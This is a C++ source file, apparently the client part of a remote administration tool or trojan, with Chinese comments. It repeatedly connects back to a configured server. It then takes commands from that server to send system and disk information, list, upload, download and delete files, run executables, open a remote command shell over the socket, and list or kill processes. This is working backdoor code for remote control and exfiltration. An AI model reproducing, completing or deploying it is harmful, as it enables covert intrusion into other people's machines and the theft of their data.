#include "stdafx.h"
#include "ThreadMain.h"
#include "Common.h"
typedef struct tagTEMPSTRUCT
{
	DWORD t;
	SOCKET sock;
	BYTE context[1024 * 5];
}TEMPSTRUCT;


CThreadMain::CThreadMain()
{
	
}


CThreadMain::~CThreadMain()
{
}

/*
功能：运行及不断尝试连接服务器
返回值：连接成功的套接字
*/
SOCKET CThreadMain::Run()
{
	SOCKET sock;
	while (true)
	{
		sock = m_sock.StartSocket(this->address);
		if (sock == NULL)
		{
			Sleep(1000);
			printf(" 》》sleep\n");
			continue;
		}
		else
			break;
	}
	return sock;
}

void CThreadMain::GetInfo(char info[])
{
	char ip[16] = { 0 };
	char port[5] = { 0 };
	int divide = 0;
	int i, j;
	for (i = 0; i < 22; i++)
	{
		if (info[i] == ':')
		{
			ip[i] = '\0';
			divide = i;
			break;
		}
		ip[i] = info[i];
	}

	for (i = 0, j = divide + 1; i < 5 && j < 22; i++, j++)
	{
		if (info[j] == '\0')
		{
			port[i] = '\0';
			break;
		}
		port[i] = info[j];
	}
	int Port = atoi(port);
	this->Time = 60;
	this->AutoFlag = 1;
	this->SetupDir = 0;
	this->AutoFlag = 0;

	this->m_sock.m_port = Port;
	strcpy(address, ip);
    
	printf("information %s:%s\n",address,port);
	printf("setting completed\n");

}

/*
参数：run函数得到返回值，及初始化时的套接字
功能：接收命令，执行命令
*/
void CThreadMain::Command(SOCKET Sock)
{
	MSGINFO_S msg;
	m_Socket = Sock;
	while (1)
	{
		if (this->RunFlag == false)
		{
			break;
		}
		memset(&msg, 0, sizeof(MSGINFO_S));
		if (m_sock.MyRecv(Sock, (char*)&msg, sizeof(MSGINFO_S)) == 0)
		{
			break;
		}
		ExecCommand(msg, Sock);
	}
	return;
}

/*
参数：1.接收到的命令信息，2.建立连接的套接字
功能：向服务器发送命令的响应信息
重要：相当于“中转站”，与服务器的OnBeginListen()函数相对应，两个函数不断进行信息的沟通
*/
void CThreadMain::ExecCommand(MSGINFO_S msg, SOCKET l_Socket)
{
	switch (msg.Msg_id)
	{
	case SYSINFO:
	{
					printf("GetSystemInfo\n");
					m_sys.SendSysinfo(l_Socket);
	}
		break;
	case DISKINFO:
	{
					 printf("GetDiskInfo\n");
					 m_disk.SendDrivers(l_Socket);

	}
		break;
	case FILELIST:
	{
					 printf("FileList\n");
					 wchar_t path[260];
					 memcpy(path, msg.context, sizeof(path));
					 m_disk.SendFileList(path, l_Socket);
	}
		break;
	case DOWNLOAD:
	{
					 printf("DownloadFile\n");
					 TEMPSTRUCT temp;
					 memcpy((void*)temp.context, (void*)msg.context, sizeof(temp.context));
					 temp.sock = l_Socket;
					 temp.t = (DWORD)&m_disk;
					 ::CloseHandle(CreateThread(0, 0, ToDownFile, (LPVOID)&temp, 0, 0));
	}
		break;
	case UPLOAD:
	{
				   printf("UpFile\n");
				   wchar_t DownPath[260];
				   memset(DownPath, 0, _countof(DownPath));
				   memcpy(DownPath, msg.context, sizeof(DownPath));
				   m_disk.UpFile(DownPath);
	}
		break;
	case FILEDATA:
	{
					 //获取上传文件数据
					 printf("FileData\n");
					 DOWNFILEDATA fi;
					 memset((char*)&fi, 0, sizeof(fi));
					 memcpy((char*)&fi, msg.context, sizeof(fi));
					 m_disk.GetFileData(fi);
	}
		break;
	case DELFILE:
	{
					printf("DelFile\n");
					FILEINFO file_info;
					memset((void*)&file_info, 0, sizeof(file_info));
					memcpy((char*)&file_info, msg.context, sizeof(file_info));
					m_disk.DelFiles(file_info);
	}
		break;
	case RUNEXE:
	{
				   printf("RunExeFile\n");
				   wchar_t path[260];
				   memcpy((void*)path, msg.context, sizeof(path));
				   m_disk.RunFile(path);
	}
		break;
	case NEWDIR:
	{
				   printf("NewDir\n");
				   wchar_t dirname[260];
				   memcpy((void*)dirname, msg.context, sizeof(dirname));
				   m_disk.NewDir(dirname);
	}
		break;
	case CMDSHELL:
	{
					 printf("CmeShell\n");
					 m_cmd.Cmd_GetSock(l_Socket);
					 ::CloseHandle(CreateThread(0, 0, SendCmd, (LPVOID)&m_cmd, 0, 0));
					 Sleep(200);
					 ::CloseHandle(CreateThread(0, 0, InitCmd, (LPVOID)&m_cmd, 0, 0));
	}
		break;
	case COMMAND: //未修改
	{
					  CMD recvcmd;
					  char recv_buff[1024];
					  memset(&recvcmd, 0, sizeof(CMD));
					  memcpy(&recvcmd, msg.context, sizeof(CMD));
					  memset(recv_buff, 0, sizeof(recv_buff));
					  strcpy_s(recv_buff, 1024, recvcmd.command);
					  /*if (m_task.ExistTask(m_cmd.GetProcID()) == false)
					  {
						  m_cmd.NoTaskExit(l_Socket);
						  break;
					  }*/
					  m_cmd.Cmd_Recv(recv_buff);
	}
		break;
	case TASKLIST:
	{
					 printf("Tasklist\n");
					 m_task.SendTask(l_Socket);
	}
		break;
	case TASKKILL:
	{
					 TASK task;
					 memset((void*)&task, 0, sizeof(task));
					 memcpy(&task, msg.context, sizeof(task));
					 m_task.KillTask(task.TaskID, l_Socket);
	}
		break;
	default:
	{
			   printf("UnKnow Command\n");
			   return;
	}
	}
}

DWORD WINAPI CThreadMain::ToDownFile(LPVOID self)
{
	TEMPSTRUCT temp;
	memcpy((void*)&temp, self, sizeof(TEMPSTRUCT));
	wchar_t DownPath[260];
	memcpy(DownPath, temp.context, sizeof(DownPath));
	CDisk *m_dis;
	m_dis = (CDisk*)temp.t;
	m_dis->DownFile(temp.sock, DownPath);
	return 0;
}
DWORD WINAPI CThreadMain::SendCmd(LPVOID self)
{
	CCmdShell* t = (CCmdShell*)self;
	t->Cmd_Send();
	return 0;
}

DWORD WINAPI CThreadMain::InitCmd(LPVOID self)
{
	CCmdShell* t = (CCmdShell*)self;
	t->Cmd_Init();
	return 0;
}